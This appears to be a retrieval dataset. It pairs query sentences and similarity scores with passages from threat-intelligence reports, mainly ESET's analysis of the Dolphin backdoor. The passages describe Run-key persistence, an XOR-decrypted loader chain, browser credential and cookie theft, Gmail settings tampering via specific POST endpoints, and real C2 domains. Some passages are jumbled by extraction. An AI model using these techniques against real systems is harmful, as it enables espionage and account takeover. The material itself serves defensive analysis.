uses a temporary scheduled task to start after installation.|0.7504577979735174|['Tactic ID Name Description Initial ScarCruft uses watering-hole attacks to T1189 Drive-by Compromise Access compromise victims.', 'Execution Command and Scripting Interpreter: T1059.006 The Dolphin loader a uses Python script.', 'Python 7/8Tactic ID Name Description Command and Scripting Interpreter: ScarCruft used malicious JavaScript for a T1059.007 JavaScript watering-hole attack.', 'ScarCruft exploits CVE-2020-1380 to T1203 Exploitation for Client Execution compromise victims.', 'Dolphin uses Windows API functions to execute T1106 Native API files and inject processes.', 'Scheduled Task/Job: Scheduled Dolphin uses a temporary scheduled task to T1053.005 Task start after installation.', 'Persistence Boot or Logon Autostart Execution: Dolphin uses Run keys for persistence of its T1547.001 Registry Run Keys / Startup Folder loader.', 'Process Injection: Portable Defense T1055.002 Dolphin can inject into other processes.', 'Executable Injection Evasion T1027 Obfuscated Files or Information Dolphin has encrypted components.', 'Credentials from Password Stores: Dolphin can obtain saved passwords from Credential T1555.003 Credentials from Web Browsers browsers.', 'Access T1539 Steal Web Session Cookie Dolphin can obtain cookies from browsers.']
After execution, the output of commands is uploaded.|1.0000000000000004|"['Step 3, another shellcode, XOR-decrypts an embedded PE file the Dolphin backdoor and loads and executes it using a custom PE loader.', 'Dolphin backdoor 3/8Dolphin is a backdoor that collects information and executes commands issued by its operators.', 'The backdoor is a regular Windows executable, written in C++.', 'It communicates with Google Drive cloud storage, which is used as its C&C server.', 'We named the backdoor Dolphin based on a PDB path found in the executable: D:\\\\Development\\\\BACKDOOR\\\\Dolphin\\\\x64\\\\Release\\\\Dolphin.pdb Persistence The backdoor periodically checks and creates its own persistence by making sure that Step 1 of the loader is run every time the system is started, via a registry Run value, in the same way as in the installer: HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ <random_run_name>\\\\%appdata%\\\\Python27({32|64})\\\\pythonw.exe <loader_step_1> <loader_encrypted_step_2> Capabilities The following basic information about the computer and the backdoor is collected: Current backdoor configuration Username Computer name Local and external IP address List of installed security products RAM size and usage Result of check for debugger and other inspection tools (such as Wireshark) OS version Current time Malware version Dolphin downloads commands, issued by its operators, from Google Drive storage and executes them.', 'After execution, the output of commands is uploaded.', 'Most of Dolphins capabilities are controlled through commands.', 'The most relevant capabilities are described below.', 'File exfiltration By default, Dolphin searches all non-fixed drives (USBs), creates directory listings and exfiltrates files by extension.', 'This search can be extended to fixed drives (HDDs), via dedicated commands.', 'The following file extensions of interest, specific to media, documents, emails, and certificates, are specified in the default configuration: jpg, doc, xls, ppt, hwp, url, csv, pdf, show, cell, eml, odt, rtf, nxl, amr, 3gp, m4a, txt, msg, key, der, cer, docx, xlsx, pptx, pfx, mp3 Besides this automatic search, specific files can be exfiltrated.']"
After execution, the output of commands is uploaded.|1.0000000000000004|"['The CAB is unpacked to%APPDATA%, and depending on architecture, the interpreter ends up in one of the following directories:%appdata%\\\\Python27(32)\\\\%appdata%\\\\Python27(64)\\\\The installer generates two file paths for loading-chain components,<loader_step_1>and<loader_encrypted_step_2>, with the format<base_dir>\\\\<inf_name>\\\\<dll_name>.<base_dir>is randomly selected from%PROGRAMDATA%%PUBLIC%%APPDATA%\\\\Microsoft%APPDATA%\\\\Microsoft\\\\Windows%LOCALAPPDATA%%LOCALAPPDATA%\\\\Microsoft%LOCALAPPDATA%\\\\Microsoft\\\\Windows<inf_name>and<dll_name>are randomly selected from existing filenames (without extension) in%windir%\\\\inf\\\\*.infand%windir%\\\\system32\\\\*.dll.To generate Step 1 of Loader, it uses a script template that is filled with randomly generated names (variables, function).', 'The template with generated example is shown in Figure 2.Figure 2.', 'Step 1 template and generated exampleThe script is then written to<loader_step_1>.Step 2 (embedded in the installer) containing the rest of the loading chain, including the payload, is encrypted with a one-byte XOR key derived from the current time and written to<loader_encrypted_step_2>.In order to persist the start of the loading chain, the installer sets a Run registry value:HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\<random_run_name>\\\\""%appdata%\\\\Python27({32|64})\\\\pythonw.exe"" ""<loader_step_1>"" ""<loader_encrypted_step_2>""The<random_run_name>is randomly selected from existing filenames matching%WINDIR%\\\\inf\\\\*.inf, discarding the.infextension.To start the loading chain after installation, it creates a one-time scheduled task.Dolphin loaderThe Dolphin loader consists of a Python script and shellcode.Step 1, the Python script, reads a specified file, XOR-decrypts its contents, and executes the resulting shellcode.Step 2, shellcode, creates a host process (random CLI executable from%WINDIR%\\\\System32\\\\*.exe), XOR-decrypts further shellcode carried within itself, and injects it into the created process.Step 3, another shellcode, XOR-decrypts an embedded PE file the Dolphin backdoor and loads and executes it using a custom PE loader.Dolphin backdoorDolphin is a backdoor that collects information and executes commands issued by its operators.', 'The backdoor is a regular Windows executable, written in C++.', 'It communicates with Google Drive cloud storage, which is used as its C&C server.We named the backdoor Dolphin based on a PDB path found in the executable:D:\\\\Development\\\\BACKDOOR\\\\Dolphin\\\\x64\\\\Release\\\\Dolphin.pdbPersistenceThe backdoor periodically checks and creates its own persistence by making sure that Step 1 of the loader is run every time the system is started, via a registry Run value, in the same way as in the installer:HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\<random_run_name>\\\\""%appdata%\\\\Python27({32|64})\\\\pythonw.exe"" ""<loader_step_1>"" ""<loader_encrypted_step_2>""CapabilitiesThe following basic information about the computer and the backdoor is collected:Current backdoor configurationUsernameComputer nameLocal and external IP addressList of installed security productsRAM size and usageResult of check for debugger and other inspection tools (such as Wireshark)OS versionCurrent timeMalware versionDolphin downloads commands, issued by its operators, from Google Drive storage and executes them.', 'After execution, the output of commands is uploaded.', 'Most of Dolphins capabilities are controlled through commands.The most relevant capabilities are described below.File exfiltrationBy default, Dolphin searches all non-fixed drives (USBs), creates directory listings and exfiltrates files by extension.', 'This search can be extended to fixed drives (HDDs), via dedicated commands.The following file extensions of interest, specific to media, documents, emails, and certificates, are specified in the default configuration:jpg, doc, xls, ppt, hwp, url, csv, pdf, show, cell, eml, odt, rtf, nxl, amr, 3gp, m4a, txt, msg, key, der, cer, docx, xlsx, pptx, pfx, mp3Besides this automatic search, specific files can be exfiltrated.In the newer versions, the default search was extended to fixed drives.', 'The command to get specific files was improved, by caching/storing it in the configuration until completion.Portable devicesAmong regular drives, Dolphin also searches portable devices such as smartphones, using the Windows Portable Device (WPD) API.', 'It creates directory listings and exfiltrates files.', 'This functionality appeared to be under development in the first version we found, for several reasons:Relying on a hardcoded path with a username that likely doesnt exist on the victims computerMissing variable initialization some variables are assumed to be zero-initialized, or dereferenced as pointers without initializationMissing extension filteringThe code is heavily based on Microsofts Portable Devices COM APIcode sample.Apart from automatic search, the operators can specify individual files to be exfiltrated from portable devices.In newer versions, this capability was finished and improved by adding extension filtering.']"
it searches the drives of compromised systems for interesting files and exfiltrates them to Google Drive.|0.8357260618500356|['We observed the following additional changes: Command to steal credentials restored in a different form; it now executes shellcode from the C&C Command to get files from portable devices completely removed Command to get files from drives is now cached/stored in the configuration until completion.', 'If interrupted (for example by computer shutdown), it is done on the next run.', 'This is also useful in the case of removable drives that may not be connected when the command is issued.', 'Internet connection check added (https://www.microsoft.com); no malicious code is executed if offline The differences between versions 2.2 and 3.0, especially the discrepancy in string encoding, suggest the possibility that the versions were being developed in parallel by different people.', 'Conclusion Dolphin is another addition to ScarCrufts extensive arsenal of backdoors abusing cloud storage services.', 'After being deployed on selected targets, it searches the drives of compromised systems for interesting files and exfiltrates them to Google Drive.', 'One unusual capability found in prior versions of the backdoor is the ability to modify the settings of victims Google and Gmail accounts to lower their security, presumably in order to maintain account access for the threat actors.', 'During our analysis of multiple versions of the Dolphin backdoor, we saw continued development and attempts to evade detection.', 'For any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.', 'ESET Research also offers private APT intelligence reports and data feeds.', 'For any inquiries about this service, visit the ESET Threat Intelligence page.']
it searches the drives of compromised systems for interesting files and exfiltrates them to Google Drive.|0.7795934480845839|['During our investigation, we saw continued development of the backdoor and attempts by the malware authors to evade detection.', 'A notable feature of earlier Dolphin versions we analyzed is the ability to modify the settings of victims signed-in Google and Gmail accounts to lower their security, most likely to maintain access to victims email inboxes.', 'In this blogpost, we provide a technical analysis of the Dolphin backdoor and explain its connection to previously documented ScarCruft activity.', 'We will present our findings about this new addition to ScarCrufts toolset at the AVAR 2022 conference.', 'Key points in this blogpost: ESET researchers analyzed Dolphin, a previously unreported backdoor used by the ScarCruft APT group.', 'Dolphin is deployed on selected targets only; it searches the drives of compromised systems for interesting files and exfiltrates them to Google Drive.', 'The backdoor was used as the final payload of a multistage attack in early 2021, involving a watering-hole attack on a South Korean online newspaper, an Internet Explorer exploit, and another ScarCruft backdoor, named BLUELIGHT.', 'Since the initial discovery of Dolphin in April 2021, ESET researchers have observed multiple versions of the backdoor, in which the threat actors improved the backdoors capabilities and made attempts to evade detection.', 'A notable feature of earlier Dolphin versions we analyzed is the ability to modify the settings of victims signed- in Google and Gmail accounts to lower their security.', 'ScarCruft profile ScarCruft, also known as APT37 or Reaper, is an espionage group that has been operating since at least 2012.', 'It primarily focuses on South Korea, but other Asian countries also have been targeted.']
it searches the drives of compromised systems for interesting files and exfiltrates them to Google Drive.|0.8357260618500356|['Most strings in this version are base64 encoded.January 2022 version 3.0In version 3.0, the code was reorganized and classes renamed, with capabilities remaining unchanged.', 'The base64-encoded strings were plaintext again in this version.', 'We observed the following additional changes:Command to steal credentials restored in a different form; it now executes shellcode from the C&CCommand to get files from portable devices completely removedCommand to get files from drives is now cached/stored in the configuration until completion.', 'If interrupted (for example by computer shutdown), it is done on the next run.', 'This is also useful in the case of removable drives that may not be connected when the command is issued.Internet connection check added (https://www.microsoft.com); no malicious code is executed if offlineThe differences between versions 2.2 and 3.0, especially the discrepancy in string encoding, suggest the possibility that the versions were being developed in parallel by different people.ConclusionDolphin is another addition to ScarCrufts extensive arsenal of backdoors abusing cloud storage services.', 'After being deployed on selected targets, it searches the drives of compromised systems for interesting files and exfiltrates them to Google Drive.', 'One unusual capability found in prior versions of the backdoor is the ability to modify the settings of victims Google and Gmail accounts to lower their security, presumably in order to maintain account access for the threat actors.', 'During our analysis of multiple versions of the Dolphin backdoor, we saw continued development and attempts to evade detection.For any inquiries about our research published on WeLiveSecurity, please contact us atthreatintel@eset.com.ESET Research also offers private APT intelligence reports and data feeds.', 'For any inquiries about this service, visit theESET Threat Intelligencepage.IoCsSHA-1FilenameESETdetectionnameDescriptionF9F6C0184CEE9C1E4E15C2A73E56D7B927EA685BN/AWin64/Agent.MSDolphin backdoor version 1.9 (x64)5B70453AB58824A65ED0B6175C903AA022A87D6AN/AWin32/Spy.Agent.QETDolphin backdoor version 2.0 (x86)21CA0287EC5EAEE8FB2F5D0542E378267D6CA0A6N/AWin64/Agent.MSDolphin backdoor version 2.0 (x64)D9A369E328EA4F1B8304B6E11B50275F798E9D6BN/AWin32/Agent.UYODolphin backdoor version 3.0 (x86)2C6CC71B7E7E4B28C2C176B504BC5BDB687C4D41N/AWin64/Agent.MSDolphin backdoor version 3.0 (x64)MITRE ATT&CK techniquesThis table was built usingversion 12of the MITRE ATT&CK framework.TacticIDNameDescriptionInitial AccessT1189Drive-by CompromiseScarCruft uses watering-hole attacks to compromise victims.ExecutionT1059.006Command and Scripting Interpreter: PythonThe Dolphin loader a uses Python script.T1059.007Command and Scripting Interpreter: JavaScriptScarCruft used malicious JavaScript for a watering-hole attack.T1203Exploitation for Client ExecutionScarCruft exploits CVE-2020-1380 to compromise victims.T1106Native APIDolphin uses Windows API functions to execute files and inject processes.PersistenceT1053.005Scheduled Task/Job: Scheduled TaskDolphin uses a temporary scheduled task to start after installation.T1547.001Boot or Logon Autostart Execution: Registry Run Keys / Startup FolderDolphin uses Run keys for persistence of its loader.Defense EvasionT1055.002Process Injection: Portable Executable InjectionDolphin can inject into other processes.T1027Obfuscated Files or InformationDolphin has encrypted components.Credential AccessT1555.003Credentials from Password Stores: Credentials from Web BrowsersDolphin can obtain saved passwords from browsers.T1539Steal Web Session CookieDolphin can obtain cookies from browsers.DiscoveryT1010Application Window DiscoveryDolphin captures the title of the active window.T1083File and Directory DiscoveryDolphin can obtain file and directory listings.T1518.001Software Discovery: Security Software DiscoveryDolphin obtains a list of installed security software.T1082System Information DiscoveryDolphin obtains various system information including OS version, computer name and RAM size.T1016System Network Configuration DiscoveryDolphin obtains the devices local and external IP address.T1016.001System Network Configuration Discovery: Internet Connection DiscoveryDolphin checks internet connectivity.T1033System Owner/User DiscoveryDolphin obtains the victims username.T1124System Time DiscoveryDolphin obtains the victims current time.CollectionT1056.001Input Capture: KeyloggingDolphin can log keystrokes.T1560.002Archive Collected Data: Archive via LibraryUsing the Zipper library, Dolphin compresses and encrypts collected data before exfiltration.T1119Automated CollectionDolphin periodically collects files with certain extensions from drives.T1005Data from Local SystemDolphin can collect files from local drives.T1025Data from Removable MediaDolphin can collect files from removable drives.T1074.001Data Staged: Local Data StagingDolphin stages collected data in a directory before exfiltration.T1113Screen CaptureDolphin can capture screenshots.Command and ControlT1071.001Application Layer Protocol: Web ProtocolsDolphin uses HTTPS to communicate with Google Drive.T1102.002Web Service: Bidirectional CommunicationDolphin communicates with Google Drive to download commands and exfiltrate data.ExfiltrationT1020Automated ExfiltrationDolphin periodically exfiltrates collected data.T1567.002Exfiltration Over Web Service: Exfiltration to Cloud StorageDolphin exfiltrates data to Google Drive.']
The content is encrypted using AES CBC with random 16-byte keys and IVs,|0.8829079323801574|['Data staging Dolphin exfiltrates data to Google Drive storage, staging the data in encrypted ZIP archives before upload.', 'The backdoor also maintains a list of files in the form of MD5 hashes, in order to avoid uploading the same file multiple times.', 'This list can be reset via a dedicated command.', 'Configuration 5/8The backdoor contains an initial default configuration that is persisted on first run and loaded on subsequent runs.', 'It is stored in the file %ProgramData%\\\\<variable_cfg_name>.inf, where <variable_cfg_name> is randomly selected from existing filenames matching %windir%\\\\inf\\\\*.inf.', 'The content is encrypted using AES CBC with random 16-byte keys and IVs, which are stored at the files beginning.', 'The configuration uses JSON format, with hash-like keys.', 'An example of a decrypted configuration is shown in Figure 3.', 'Figure 3.', 'Dolphin backdoor configuration The configuration can be modified through commands.', 'It contains, among others, the following: Encryption keys Credentials for Google Drive API access Window titles to keylog List of file extensions to exfiltrate Dolphin evolution Since the initial discovery of Dolphin in April 2021, we have observed multiple versions of the backdoor, in which the threat actors improved the backdoors capabilities and made attempts to evade detection.']
The content is encrypted using AES CBC with random 16-byte keys and IVs,|0.8829079323801574|['It steals the existing cookie of the logged-in account from the browser and crafts requests that modify the settings.First, it enables access to Gmail via the IMAP protocol by sending an HTTP POST request to:https://mail.google.com/mail/u/0/?ik=<GM_ID_KEY>&at=<GM_ACTION_TOKEN>&view=up&act=prefsThen it enables less secure app access by sending an undocumented RPC request via an HTTP POST to:https://myaccount.google.com/_/AccountSettingsUi/data/batchexecuteThese modifications are referred to as thunder access in the backdoor, likely being a reference to the Thunderbird email client.', 'Accessing their victims inboxes with a third-party client via IMAP probably helps ScarCruft operators maintain access to the victims emails after stealing credentials, which may not be enough on their own, due to Googles detection of suspicious login attempts.This feature was found in versions 1.9 and 2.0 of the backdoor; it is not present in versions 2.2 or 3.0.Data stagingDolphin exfiltrates data to Google Drive storage, staging the data in encrypted ZIP archives before upload.', 'The backdoor also maintains a list of files in the form of MD5 hashes, in order to avoid uploading the same file multiple times.', 'This list can be reset via a dedicated command.ConfigurationThe backdoor contains an initial default configuration that is persisted on first run and loaded on subsequent runs.', 'It is stored in the file%ProgramData%\\\\<variable_cfg_name>.inf, where<variable_cfg_name>is randomly selected from existing filenames matching%windir%\\\\inf\\\\*.inf.', 'The content is encrypted using AES CBC with random 16-byte keys and IVs, which are stored at the files beginning.', 'The configuration uses JSON format, with hash-like keys.', 'An example of a decrypted configuration is shown in Figure 3.Figure 3.', 'Dolphin backdoor configurationThe configuration can be modified through commands.', 'It contains, among others, the following:Encryption keysCredentials for Google Drive API accessWindow titles to keylogList of file extensions to exfiltrateDolphin evolutionSince the initial discovery of Dolphin in April 2021, we have observed multiple versions of the backdoor, in which the threat actors improved the backdoors capabilities and made attempts to evade detection.', 'Figure 4 summarizes the versions seen; a more detailed description of the version changes is provided below.Figure 4.']
Most strings in this version are base64 encoded.|1.0|['Figure 4.', 'Dolphin evolution timeline November 2021 version 2.0 Version 2.0 introduced the following changes to the version found in April 2021: 6/8Dynamic resolution of suspicious APIs instead of static imports (for example GetAsyncKeyState) added Shellcode capability finished and improved Persisted shellcode stored in files instead of registry Persisted shellcode loaded and executed on Dolphin startup (previously missing) Portable device file exfiltration capability finished and improved Exfiltration by extensions added Recognition of internal memory and SD cards (from device ID) added Command to get files from portable devices effectively a NOP Device/drive detection and file exfiltration improved Dolphin now unconditionally creates directory listings and exfiltrates files by extension every 30 minutes for all drives and devices (fixed drives, removable drives, portable devices).', 'Previously, it was just for removable drives; fixed drives were disabled by default and the code used for accessing portable devices was buggy and broken.', 'December 2021 version 2.2 Changes introduced in version 2.2 focused mainly on detection evasion.', 'The credential-stealing capability and commands related to it the credential stealing and Google account commands were removed.', 'Most strings in this version are base64 encoded.', 'January 2022 version 3.0 In version 3.0, the code was reorganized and classes renamed, with capabilities remaining unchanged.', 'The base64- encoded strings were plaintext again in this version.', 'We observed the following additional changes: Command to steal credentials restored in a different form; it now executes shellcode from the C&C Command to get files from portable devices completely removed Command to get files from drives is now cached/stored in the configuration until completion.', 'If interrupted (for example by computer shutdown), it is done on the next run.', 'This is also useful in the case of removable drives that may not be connected when the command is issued.']
The base64-encoded strings were plaintext again in this version.|1.0|['Previously, it was just for removable drives; fixed drives were disabled by default and the code used for accessing portable devices was buggy and broken.', 'December 2021 version 2.2 Changes introduced in version 2.2 focused mainly on detection evasion.', 'The credential-stealing capability and commands related to it the credential stealing and Google account commands were removed.', 'Most strings in this version are base64 encoded.', 'January 2022 version 3.0 In version 3.0, the code was reorganized and classes renamed, with capabilities remaining unchanged.', 'The base64- encoded strings were plaintext again in this version.', 'We observed the following additional changes: Command to steal credentials restored in a different form; it now executes shellcode from the C&C Command to get files from portable devices completely removed Command to get files from drives is now cached/stored in the configuration until completion.', 'If interrupted (for example by computer shutdown), it is done on the next run.', 'This is also useful in the case of removable drives that may not be connected when the command is issued.', 'Internet connection check added (https://www.microsoft.com); no malicious code is executed if offline The differences between versions 2.2 and 3.0, especially the discrepancy in string encoding, suggest the possibility that the versions were being developed in parallel by different people.', 'Conclusion Dolphin is another addition to ScarCrufts extensive arsenal of backdoors abusing cloud storage services.']
The base64-encoded strings were plaintext again in this version.|1.0|['Figure 4 summarizes the versions seen; a more detailed description of the version changes is provided below.Figure 4.', 'Dolphin evolution timelineNovember 2021 version 2.0Version 2.0 introduced the following changes to the version found in April 2021:Dynamic resolution of suspicious APIs instead of static imports (for exampleGetAsyncKeyState) addedShellcode capability finished and improvedPersisted shellcode stored in files instead of registryPersisted shellcode loaded and executed on Dolphin startup (previously missing)Portable device file exfiltration capability finished and improvedExfiltration by extensions addedRecognition of internal memory and SD cards (from device ID) addedCommand to get files from portable devices effectively a NOPDevice/drive detection and file exfiltration improvedDolphin now unconditionally creates directory listings and exfiltrates files by extension every 30 minutes for all drives and devices (fixed drives, removable drives, portable devices).', 'Previously, it was just for removable drives; fixed drives were disabled by default and the code used for accessing portable devices was buggy and broken.December 2021 version 2.2Changes introduced in version 2.2 focused mainly on detection evasion.', 'The credential-stealing capability and commands related to it the credential stealing and Google account commands were removed.', 'Most strings in this version are base64 encoded.January 2022 version 3.0In version 3.0, the code was reorganized and classes renamed, with capabilities remaining unchanged.', 'The base64-encoded strings were plaintext again in this version.', 'We observed the following additional changes:Command to steal credentials restored in a different form; it now executes shellcode from the C&CCommand to get files from portable devices completely removedCommand to get files from drives is now cached/stored in the configuration until completion.', 'If interrupted (for example by computer shutdown), it is done on the next run.', 'This is also useful in the case of removable drives that may not be connected when the command is issued.Internet connection check added (https://www.microsoft.com); no malicious code is executed if offlineThe differences between versions 2.2 and 3.0, especially the discrepancy in string encoding, suggest the possibility that the versions were being developed in parallel by different people.ConclusionDolphin is another addition to ScarCrufts extensive arsenal of backdoors abusing cloud storage services.', 'After being deployed on selected targets, it searches the drives of compromised systems for interesting files and exfiltrates them to Google Drive.', 'One unusual capability found in prior versions of the backdoor is the ability to modify the settings of victims Google and Gmail accounts to lower their security, presumably in order to maintain account access for the threat actors.']
another shellcode, XOR-decrypts an embedded PE file – the Dolphin backdoor – and loads and executes it using a custom PE loader.|0.9715291295767549|"['In order to persist the start of the loading chain, the installer sets a Run registry value: HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ <random_run_name>\\\\%appdata%\\\\Python27({32|64})\\\\pythonw.exe <loader_step_1> <loader_encrypted_step_2> The <random_run_name> is randomly selected from existing filenames matching %WINDIR%\\\\inf\\\\*.inf, discarding the .inf extension.', 'To start the loading chain after installation, it creates a one-time scheduled task.', 'Dolphin loader The Dolphin loader consists of a Python script and shellcode.', 'Step 1, the Python script, reads a specified file, XOR-decrypts its contents, and executes the resulting shellcode.', 'Step 2, shellcode, creates a host process (random CLI executable from %WINDIR%\\\\System32\\\\*.exe), XOR-decrypts further shellcode carried within itself, and injects it into the created process.', 'Step 3, another shellcode, XOR-decrypts an embedded PE file the Dolphin backdoor and loads and executes it using a custom PE loader.', 'Dolphin backdoor 3/8Dolphin is a backdoor that collects information and executes commands issued by its operators.', 'The backdoor is a regular Windows executable, written in C++.', 'It communicates with Google Drive cloud storage, which is used as its C&C server.', 'We named the backdoor Dolphin based on a PDB path found in the executable: D:\\\\Development\\\\BACKDOOR\\\\Dolphin\\\\x64\\\\Release\\\\Dolphin.pdb Persistence The backdoor periodically checks and creates its own persistence by making sure that Step 1 of the loader is run every time the system is started, via a registry Run value, in the same way as in the installer: HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ <random_run_name>\\\\%appdata%\\\\Python27({32|64})\\\\pythonw.exe <loader_step_1> <loader_encrypted_step_2> Capabilities The following basic information about the computer and the backdoor is collected: Current backdoor configuration Username Computer name Local and external IP address List of installed security products RAM size and usage Result of check for debugger and other inspection tools (such as Wireshark) OS version Current time Malware version Dolphin downloads commands, issued by its operators, from Google Drive storage and executes them.', 'After execution, the output of commands is uploaded.']"
there was only one stage being decrypted in memory|0.7716618684388571|['Interestingly, the code related to this DNS C&C communication is only present in samples that use it, meaning that the builder is modular and that there might be samples in the wild with unreported features.', 'We continue monitoring this group and malware family for updates on possible variations of C&C communication protocols being abused.', 'In all versions, the malware retrieves information on the infected machine and sends it to the C&C encrypted with DES.', 'Collected machine information includes the following: Randomly generated GUID Hostname Domain name Username User privileges Processor architecture Current process ID Operating system version Current file path 4/9Local IP address and port used to send the network packet The configuration is encrypted with a hardcoded DES key and is a few bytes long following the structure enumerated below: Table 2.', 'Configuration structure Length (in Field content Comment Example bytes) Header 4 We only found one value 0x00000001 {89D0E853-FA08- GUID 38 Follows the Microsoft format 4f94-A5FE- A90E6869E074} Size of the C&C section 4 0x00000018 Size of the next C&C domain 4 0x00000014 name and port 0x01 = regular C&C C&C type 1 0x05 = DNS tunneling 0x01 0x00 = regular C&C C&C domain name Variable dev.gitlabs.me Port number 4 0x00000050 Next section contains all the Size of next section 4 hardcoded names (folder, files, 0x00000034 registry values) Name of the hardcoded directory where files are Variable The folder is located either in % gtdcfp copied Name of the executable Variable TextInputHost.exe vulnerable to side loading Name of the malicious side- Variable rc.dll loaded DLL Name of the binary file containing the encoded Variable rc.bin Stage 1 Name of the service or registry key value used for Variable gtdcfp persistence We noted that Stage 2 does not embed the configuration file, which is copied in memory by the previous stage.', 'We only saw one case where there was only one stage being decrypted in memory and the configuration was hardcoded.', 'Interestingly, all the samples of this new version had a domain name as its C&C.', 'In the previous version of SysUpdate, the group used hardcoded IP addresses as C&C.', 'It is possible that this change is a consequence of the new DNS TXT records communication feature as it requires a domain name.', 'SysUpdate samples for Linux While investigating SysUpdates infrastructure, we found some ELF files linked to some C&C servers.', 'We analyzed them and concluded that the files were a SysUpdate version made for the Linux platform.']
Command execution|0.7634177770491818|['RIG Exploit Kit In-Depth AnalysisTLP:CLEAR RIG:In-DepthAnalysis Contents References 2 1 Introduction 3 2 ExecutiveSummary 4 3 TheRIGTimeline 5 3.1 FirstRelease .', '.', '.', '.', '.', '.', '.']
Command execution|0.7634177770491818|['W H I T E P A P E R A FireEye Company MATRYOSHKA MINING Lessons from Operation RussianDoll, January 2016 By Michael Bailey SECURITY CONSULTINGMatryoshka Mining Lessons from Operation RussianDoll, January 2016 by Michael Bailey CONTENTS Introduction .', '.', '.', '.', '.', '.', '.']
Command execution|0.7634177770491818|['List any CEMA specific assumptions.', '2.', '(U) Mission.', 'State the commanders mission and describe cyberspace operations and EW to support the base plan or order.', '3.', '(U) Execution.', 'a.', 'Scheme of Cyberspace Electromagnetic Activities.', 'Describe how cyberspace and EW operations support the commanders intent and concept of operations.', 'Establish the priorities of support to units for each phase of the operation.', 'State how cyberspace and EW effects will degrade, disrupt, deny, and deceive the enemy.']
Command execution|1.0|"['Diagram for a heartbeat C2 message.', 'The C2 server returns JSON data instructing the backdoor with the next actions to take.', 'The JSON response contains the same two main keys: code: A value specifying an action or command args: A string or JSON dictionaries with multiple key value pairs containing the required arguments for the specified command InvisibleFerret implements a total of eight commands described below in Table 4.', 'Command Description Checks if the args value is equal to delete and if so, closes the session.', 'To notify the C2 server, it ssh_cmd sends the message string [close].', 'Command execution.', ""Extracts the command value from args['cmd'] and runs it."", 'JSON results ssh_obj sent to the C2 server with code value 1 and args indicating the results.', 'Send contents of keylogger buffer and clipboard data.', 'Reports to C2 server with JSON code ssh_clip value 3 and args containing the collected data.', '9/17ssh_run Downloads and runs the browser stealer component.']"
Operating system version|0.8282125686890636|['After changing the note for a victim, the botmaster requested a list of SMS messages from a victim with the HTTP request POST /stuff .php?mode=showSmsList.', 'The response to this request was a long list of more than 900 SMS messages from one victim.', 'The SMS messages are analysed in Section 6.', 'The original HTTP response with the SMS list was a JSON fi le using Unicode encoding (\\\\u chars) for transferring Russian characters.', 'The following is an example: {response: [{conversations: {+900:[{body:\\\\u0421\\\\u043f \\\\u0438\\\\u0441\\\\u0430\\\\u043d\\\\u0438 The decoded text in Russian is as follows (the password was redacted): : Platbox (RUB 120.00); : 342365.  .', '.', 'The English translation of this message is: Withdrawal of funds: Platbox (RUB 120.00); password: 342365.', 'Do not disclose the password to ANYONE.', 'Only fraudsters request passwords.', 'This SMS seems to be a message from the Platbox Russian payment system saying that 120 Russian Rubles have been withdrawn.', 'Despite our initial assumption that the botnet was only looking for two-factor authentication messages, it is unclear why the botmasters are monitoring these messages.']
Operating system version|0.8295711038894622|"['These domains include is to create.', ""In this instance, the configured named bbs.afbjz.com', newhose.ntimobile.com', and was winsvcfs.dll, as shown in Figure 2."", ""Due to the www.adv138mail.com'32."", 'namebeing configurable, theRAT willnot alwaysbe called winsvcfs.dll.', 'The configuration block also The RAT has many different capabilities and contains a callback domain and port for the runs onmultipleversionsoftheMicrosoft Windows malwares command and control communications.', 'operating system.', ""The RAT's behaviour changes The callback domain is configured to be slightly depending onwhichversionof theWindows nateon.duamlive.com and the port is configured to operating system it is installed on and which be80 (50inhexadecimal), also showninFigure2."", 'modules are installed.', 'Modules used by the RAT deployed to the SK Communications network If no configuration is specified, the malware include: uses default values instead.', 'The default callback location hardcoded into the malware is the private IP address, 192.168.0.200.', 'This address is not 28Theprocesssvchost.exe is agenerichostprocessforservices 31 Symantec antivirus software detects nateon.exe as which runfromDLLs.']"
Operating system version|0.8650803686783772|[']com All values that are colored in red are now chosen at random from a hard-coded list that is decoded from the stage 2 content (using the Type C XOR algorithm).', 'The encrypted blob (cookie value) is initially a JSON dictionary, encrypted with the RC4 algorithm (using the key BD DE 96 D2 9C 68 EE 06 49 64 D1 E5 8A 86 05 12 B0 9A 50 00 4E F2 E4 92 5C 76 AB FC 90 23 DF C6, decoded from stage 2 content), XORed (using the Type B XOR algorithm), base64- encoded and URL-encoded.', 'The actual JSON content is very similar to the one that is sent by VileDropper to the C2 server: Provided by JSON Key VileDropper via Value the command line Hard-coded value (65 in the last sample we analyzed) which might be a v version number.', 'u The target identifier.', 'a The list of security solutions installed on the targeted computer.', 'w The targets operating system version.', 'd A fixed identifier, which might designate a campaign or version.', 'n The targets fully qualified login (%USERDOMAIN%\\\\%USERNAME%).', 'r Flag that indicates if the mutex creation succeeded (1) or failed (0).', 'xn Current process name (e.g., SerenadeDACplApp.exe).', 's Constant value embedded in the code and equal to 0.']
Operating system version|0.8282125686890636|"['After changing the note for a victim, the botmaster requested a list of SMS messages from a victim with the HTTP request POST /stuff .php?mode=showSmsList.', 'The response to this request was a long list of more than 900 SMS messages from one victim.', 'The SMS messages are analysed in Section 6.', 'The original HTTP response with the SMS list was a JSON fi le using Unicode encoding (\\\\u chars) for transferring Russian characters.', 'The following is an example: {""response"": [{""conversations"": {""+900"":[{""body"":""\\\\u0421\\\\u043f \\\\u0438\\\\u0441\\\\u0430\\\\u043d\\\\u0438 The decoded text in Russian is as follows (the password was redacted): : Platbox (RUB 120.00); : 342365.  .', '.', 'The English translation of this message is: Withdrawal of funds: Platbox (RUB 120.00); password: 342365.', 'Do not disclose the password to ANYONE.', 'Only fraudsters request passwords.', 'This SMS seems to be a message from the Platbox Russian payment system saying that 120 Russian Rubles have been withdrawn.', 'Despite our initial assumption that the botnet was only looking for two-factor authentication messages, it is unclear why the botmasters are monitoring these messages.']"
